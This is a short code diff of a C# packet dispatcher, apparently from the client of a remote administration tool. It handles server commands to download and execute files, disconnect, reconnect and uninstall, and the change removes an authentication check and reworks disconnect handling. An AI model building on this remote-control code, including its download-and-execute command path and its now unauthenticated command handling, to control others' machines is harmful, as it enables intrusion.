@@ -11,19 +11,6 @@ namespace xClient.Core.Packets
         {
             var type = packet.GetType();
 
-            if (!ClientData.IsAuthenticated)
-            {
-                if (type == typeof(ServerPackets.GetAuthentication))
-                {
-                    CommandHandler.HandleGetAuthentication((ServerPackets.GetAuthentication)packet, client);
-                }
-                else if (type == typeof(ServerPackets.SetAuthenticationSuccess))
-                {
-                    ClientData.IsAuthenticated = true;
-                }
-                return;
-            }
-
             if (type == typeof(ServerPackets.DoDownloadAndExecute))
             {
                 CommandHandler.HandleDoDownloadAndExecute((ServerPackets.DoDownloadAndExecute)packet,
@@ -35,11 +22,12 @@ namespace xClient.Core.Packets
             }
             else if (type == typeof(ServerPackets.DoClientDisconnect))
             {
-                Program.Disconnect();
+                ClientData.Disconnect = true;
+                client.Disconnect();
             }
             else if (type == typeof(ServerPackets.DoClientReconnect))
             {
-                Program.Disconnect(true);
+                client.Disconnect();
             }
             else if (type == typeof(ServerPackets.DoClientUninstall))
             {
